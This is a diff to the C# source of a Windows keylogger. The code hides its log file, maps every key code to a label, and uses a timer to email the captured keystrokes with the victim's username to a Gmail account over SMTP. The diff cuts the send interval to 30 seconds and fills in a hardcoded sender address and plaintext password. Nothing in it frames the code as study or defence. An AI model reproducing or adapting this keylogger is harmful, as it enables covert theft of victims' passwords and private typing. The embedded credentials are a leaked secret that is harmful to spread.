@@ -23,7 +23,7 @@ namespace KeyLogger
         {
             if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
             Timer t = new Timer();
-            t.Interval = 60000 * 20;
+            t.Interval = 60000 * 0.5;
             t.Elapsed += sendEmail;
             t.AutoReset = true;
             t.Enabled = true;
@@ -51,22 +51,25 @@ namespace KeyLogger
 
             if (code == 8) key = "[Back]";
             else if (code == 9) key = "[TAB]";
-            else if (code == 13) key = "[Enter]";
-            else if (code == 19) key = "[Pause]";
-            else if (code == 20) key = "[Caps Lock]";
-            else if (code == 27) key = "[Esc]";
-            else if (code == 32) key = "[Space]";
-            else if (code == 33) key = "[Page Up]";
-            else if (code == 34) key = "[Page Down]";
-            else if (code == 35) key = "[End]";
-            else if (code == 36) key = "[Home]";
-            else if (code == 37) key = "Left]";
-            else if (code == 38) key = "[Up]";
-            else if (code == 39) key = "[Right]";
-            else if (code == 40) key = "[Down]";
-            else if (code == 44) key = "[Print Screen]";
-            else if (code == 45) key = "[Insert]";
-            else if (code == 46) key = "[Delete]";
+            else if (code == 13) key = "[ENTER]";
+            else if (code == 16) key = "[SHIFT]";
+            else if (code == 17) key = "[CTRL]";
+            else if (code == 18) key = "[ALT]";
+            else if (code == 19) key = "[PAUSE/BREAK]";
+            else if (code == 20) key = "[CAPS LOCK]";
+            else if (code == 27) key = "[ESCAPE]";
+            else if (code == 32) key = "[SPACE]";
+            else if (code == 33) key = "[PAGE UP]";
+            else if (code == 34) key = "[PAGE DOWN]";
+            else if (code == 35) key = "[END]";
+            else if (code == 36) key = "[HOME]";
+            else if (code == 37) key = "[LEFT ARROW]";
+            else if (code == 38) key = "[UP ARROW]";
+            else if (code == 39) key = "[RIGHT ARROW]";
+            else if (code == 40) key = "[DOWN ARROW]";
+            else if (code == 44) key = "[PRINT SCREEN]";
+            else if (code == 45) key = "[INSERT]";
+            else if (code == 46) key = "[DELETE]";
             else if (code == 48) key = "0";
             else if (code == 49) key = "1";
             else if (code == 50) key = "2";
@@ -103,19 +106,19 @@ namespace KeyLogger
             else if (code == 88) key = "x";
             else if (code == 89) key = "y";
             else if (code == 90) key = "z";
-            else if (code == 91) key = "[Windows]";
-            else if (code == 92) key = "[Windows]";
-            else if (code == 93) key = "[List]";
-            else if (code == 96) key = "0";
-            else if (code == 97) key = "1";
-            else if (code == 98) key = "2";
-            else if (code == 99) key = "3";
-            else if (code == 100) key = "4";
-            else if (code == 101) key = "5";
-            else if (code == 102) key = "6";
-            else if (code == 103) key = "7";
-            else if (code == 104) key = "8";
-            else if (code == 105) key = "9";
+            else if (code == 91) key = "[LEFT WINDOWS]";
+            else if (code == 92) key = "[RIGHT WINDOWS]";
+            else if (code == 93) key = "[LIST]";
+            else if (code == 96) key = "NumPad 0";
+            else if (code == 97) key = "NumPad 1";
+            else if (code == 98) key = "NumPad 2";
+            else if (code == 99) key = "NumPad 3";
+            else if (code == 100) key = "NumPad 4";
+            else if (code == 101) key = "NumPad 5";
+            else if (code == 102) key = "NumPad 6";
+            else if (code == 103) key = "NumPad 7";
+            else if (code == 104) key = "NumPad 8";
+            else if (code == 105) key = "NumPad 9";
             else if (code == 106) key = "*";
             else if (code == 107) key = "+";
             else if (code == 109) key = "-";
@@ -133,14 +136,14 @@ namespace KeyLogger
             else if (code == 121) key = "[F10]";
             else if (code == 122) key = "[F11]";
             else if (code == 123) key = "[F12]";
-            else if (code == 144) key = "[Num Lock]";
-            else if (code == 145) key = "[Scroll Lock]";
-            else if (code == 160) key = "[Shift]";
-            else if (code == 161) key = "[Shift]";
-            else if (code == 162) key = "[Ctrl]";
-            else if (code == 163) key = "[Ctrl]";
-            else if (code == 164) key = "[Alt]";
-            else if (code == 165) key = "[Alt]";
+            else if (code == 144) key = "[NUM LOCK]";
+            else if (code == 145) key = "[SCROLL LOCK]";
+            else if (code == 160) key = "[SHIFT]";
+            else if (code == 161) key = "[SHIFT]";
+            else if (code == 162) key = "[CTRL]";
+            else if (code == 163) key = "[CTRL]";
+            else if (code == 164) key = "[ALT]";
+            else if (code == 165) key = "[ALT]";
             else if (code == 187) key = "=";
             else if (code == 186) key = "ç";
             else if (code == 188) key = ",";
@@ -167,9 +170,9 @@ namespace KeyLogger
                 MailMessage mail = new MailMessage();
                 SmtpClient server = new SmtpClient("smtp.gmail.com");
 
-                mail.From = new MailAddress("email");
-                mail.To.Add("dest");
-                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;
+                mail.From = new MailAddress("marsopakeylog@gmail.com");
+                mail.To.Add("marsopakeylog@gmail.com");
+                mail.Subject = "[Log: " + Environment.UserName + "]";
 
                 if (!File.Exists(path)) return;
                 StreamReader r = new StreamReader(path);
@@ -179,7 +182,7 @@ namespace KeyLogger
                 mail.Body = content;
 
                 server.Port = 587;
-                server.Credentials = new NetworkCredential("email", "password");
+                server.Credentials = new NetworkCredential("marsopakeylog@gmail.com", "64225289");
                 server.EnableSsl = true;
                 server.Send(mail);
             }
